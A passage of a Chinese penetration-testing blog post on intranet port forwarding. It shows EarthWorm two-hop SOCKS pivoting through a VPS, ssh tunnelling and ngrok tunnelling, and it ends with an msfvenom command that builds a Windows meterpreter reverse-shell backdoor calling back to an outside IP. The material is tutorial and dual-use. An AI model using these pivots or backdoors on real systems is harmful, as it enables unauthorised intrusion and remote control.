+<h4 id="0x04-2-4-二级网络环境（二）"><a href="#0x04-2-4-二级网络环境（二）" class="headerlink" title="0x04.2.4 二级网络环境（二）"></a>0x04.2.4 二级网络环境（二）</h4><p>假设我们获得了右侧A主机和B主机的控制权限，A主机没有公网IP，也无法访问内网资源。B主机可以访问内网资源，但无法访问外网。</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-23.png" alt=""></p>
+<p>这次操作有四步。</p>
+<ol>
+<li><p>在公网vps（45.xxx.xxx.72）添加转接隧道，将10800端口收到的代理请求转交给8888端口</p>
+<p> ./ew_for_linux64 -s lcx_listen -l 10800 -e 8888</p>
+</li>
+</ol>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-24.png" alt=""></p>
+<p>2.B（192.168.153.138）主机正向开启8888端口</p>
+<pre><code>ew_for_Win.exe -s ssocksd -l 9999</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-25.png" alt=""></p>
+<p>3.A主机利用lcx_slave方式，将公网VPS的888端口和B主机的999端口连接起来</p>
+<pre><code>ew_for_Win.exe -s lcx_slave -d 45.xxx.xxx.72 -e 8888 -f 192.168.153.138 -g 9999</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-26.png" alt=""></p>
+<p>现在my pc可通过访问45.xxx.xxx.72:10800来使用192.168.153.138主机提供的socks5代理，代理成功，vps会有rssocks cmd_socket OK!提示</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-27.png" alt=""></p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-28.png" alt=""></p>
+<h3 id="0x05-ssh隧道代理转发"><a href="#0x05-ssh隧道代理转发" class="headerlink" title="0x05 ssh隧道代理转发"></a>0x05 ssh隧道代理转发</h3><p>ssh有三个强大的端口转发命令，分别是本地转发、远程转发、动态转发。</p>
+<pre><code>本地访问127.0.0.1:port1就是host:port2(用的更多)
+ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发
+
+访问host:port2就是访问127.0.0.1:port1
+ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发
+
+可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口
+ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip   #正向隧道，监听本地port
+
+可以将dmz_host的hostport端口转发到remote_ip的port端口
+ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip   #反向隧道，用于内网穿透防火墙限制之类
+
+socket代理:
+ssh -qTfnN -D port remotehost
+
+参数详解：
+-q Quiet mode. 安静模式
+-T Disable pseudo-tty allocation. 不占用 shell 了
+-f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数
+-N Do not execute a remote command. 不执行远程命令，端口转发就用它了
+-L port:host:hostport 
+将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport
+-R port:host:hostport 
+将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 工作原理是这样的, 远程主机上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转向出去, 同时本地主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有用 root 登录远程主机才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport
+-D port 
+指定一个本地机器 “动态的’’ 应用程序端口转发. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接. 目前支持 SOCKS协议, 将充当SOCKS服务器. 只有 root 才能转发特权端口. 可以在配置文件中指定动态端口的转发.</code></pre><h4 id="0x05-1-ssh本地转发"><a href="#0x05-1-ssh本地转发" class="headerlink" title="0x05.1 ssh本地转发"></a>0x05.1 ssh本地转发</h4><p>远程管理服务器上的mysql，mysql不能直接root远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到本地1234端口</p>
+<pre><code>ssh -CfNg -L 1234 127.0.0.1:3306 root@45.32.31.121</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-29.png" alt=""></p>
+<h4 id="0x05-2-ssh远程转发"><a href="#0x05-2-ssh远程转发" class="headerlink" title="0x05.2 ssh远程转发"></a>0x05.2 ssh远程转发</h4><p>内网的服务器，外网不能直接访问，使用远程转发，将内网的服务器端口转发到外网端口。这时候访问外网的端口，就访问到了内网的端口。</p>
+<pre><code>ssh -CfNg -R 81:127.0.0.1:80 root@192.168.153.142</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-30.png" alt=""></p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-31.png" alt=""></p>
+<p>现在在192.168.153.142访问127.0.0.1:81就是访问内网的服务器的80端口。</p>
+<h4 id="0x05-2-ssh动态转发socks代理"><a href="#0x05-2-ssh动态转发socks代理" class="headerlink" title="0x05.2 ssh动态转发socks代理"></a>0x05.2 ssh动态转发socks代理</h4><p>把远程主机设置成代理，来代理访问不能访问的资源。在地机器上分配了一个监听端口, 一旦这个端口上有了连接,该连接就经过ssh隧道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接。</p>
+<pre><code>ssh -qTfnN -D 1080  root@45.32.31.121</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-32.png" alt=""></p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-33.png" alt=""></p>
+<h3 id="0x06-内网穿透平台"><a href="#0x06-内网穿透平台" class="headerlink" title="0x06 内网穿透平台"></a>0x06 内网穿透平台</h3><p>例如<a href="https://www.ngrok.cc/、https://natapp.cn/等" target="_blank" rel="noopener">https://www.ngrok.cc/、https://natapp.cn/等</a><br>以ngrok为例，注册并开通隧道</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-34.png" alt=""></p>
+<p>下载对应的客户端，下载地址为：<a href="https://www.ngrok.cc/#down-client" target="_blank" rel="noopener">https://www.ngrok.cc/#down-client</a> 。<br>运行</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-35.png" alt=""></p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-36.png" alt=""></p>
+<p>生成backdoor。监听的IP为server.ngrok.cc的ip，端口为开通隧道时填写的远程端口</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.90.92.56  LPORT=52524 -f exe &gt; shell.exe</code></pre><p>kali上执行</p>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/port-forwarding-37.png" alt=""></p>
+<h3 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h3><ol>
+<li><a href="http://blog.creke.net/722.html" target="_blank" rel="noopener">SSH隧道与端口转发及内网穿透</a></li>
+<li><a href="http://blog.csdn.net/xyyangkun/article/details/7025854" target="_blank" rel="noopener">SSH的端口转发</a></li>
+<li><a href="http://wooyun.jozxing.cc/static/drops/tips-5234.html" target="_blank" rel="noopener">内网渗透随想</a></li>
+<li><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">从零开始内网渗透学习</a></li>
+<li><a href="http://wooyun.jozxing.cc/static/drops/tools-15000.html" target="_blank" rel="noopener">内网渗透中转发工具总结</a></li>
+<li><a href="http://fuping.site/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/" target="_blank" rel="noopener">MS17-010漏洞检测与内网穿透技术的应用</a></li>
+<li><a href="http://bobao.360.cn/learning/detail/3502.html" target="_blank" rel="noopener">内网漫游之SOCKS代理大结局</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/25423394" target="_blank" rel="noopener">正向代理和反向代理的区别</a></li>
+</ol>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-正向和反向代理"><span class="toc-number">1.</span> <span class="toc-text">0x01 正向和反向代理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#正向代理-Forward-Proxy"><span class="toc-number">1.1.</span> <span class="toc-text">正向代理(Forward Proxy)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#反向代理（reverse-proxy）"><span class="toc-number">1.2.</span> <span class="toc-text">反向代理（reverse proxy）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#简单区分"><span class="toc-number">1.3.</span> <span class="toc-text">简单区分</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-lcx转发"><span class="toc-number">2.</span> <span class="toc-text">0x02 lcx转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-nc反弹"><span class="toc-number">3.</span> <span class="toc-text">0x03 nc反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#正向连接"><span class="toc-number">3.1.</span> <span class="toc-text">正向连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#反向连接"><span class="toc-number">3.2.</span> <span class="toc-text">反向连接</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-socks代理工具"><span class="toc-number">4.</span> <span class="toc-text">0x04 socks代理工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-0-ssocks"><span class="toc-number">5.</span> <span class="toc-text">0x04.0 ssocks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-1-reGeorg-Proxychains代理"><span class="toc-number">5.1.</span> <span class="toc-text">0x04.1 reGeorg+Proxychains代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-2-ew穿透"><span class="toc-number">5.2.</span> <span class="toc-text">0x04.2 ew穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x04-2-1-正向SOCKS5服务器"><span class="toc-number">5.2.1.</span> <span class="toc-text">0x04.2.1 正向SOCKS5服务器</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-2-2-反弹SOCKS5服务器"><span class="toc-number">5.3.</span> <span class="toc-text">0x04.2.2 反弹SOCKS5服务器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-2-3-二级网络环境（一）"><span class="toc-number">5.4.</span> <span class="toc-text">0x04.2.3 二级网络环境（一）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-2-4-二级网络环境（二）"><span class="toc-number">5.5.</span> <span class="toc-text">0x04.2.4 二级网络环境（二）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-ssh隧道代理转发"><span class="toc-number">6.</span> <span class="toc-text">0x05 ssh隧道代理转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05-1-ssh本地转发"><span class="toc-number">6.1.</span> <span class="toc-text">0x05.1 ssh本地转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05-2-ssh远程转发"><span class="toc-number">6.2.</span> <span class="toc-text">0x05.2 ssh远程转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05-2-ssh动态转发socks代理"><span class="toc-number">6.3.</span> <span class="toc-text">0x05.2 ssh动态转发socks代理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-内网穿透平台"><span class="toc-number">7.</span> <span class="toc-text">0x06 内网穿透平台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-参考"><span class="toc-number">8.</span> <span class="toc-text">0x07 参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&text=内网端口转发及穿透" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&title=内网端口转发及穿透" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&is_video=false&description=内网端口转发及穿透" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网端口转发及穿透&body=Check out this article: http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&title=内网端口转发及穿透" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&title=内网端口转发及穿透" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&title=内网端口转发及穿透" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&title=内网端口转发及穿透" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/experience/network-port-forwarding-and-penetration.html&name=内网端口转发及穿透&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 zerokeeper
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zerokeeper';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
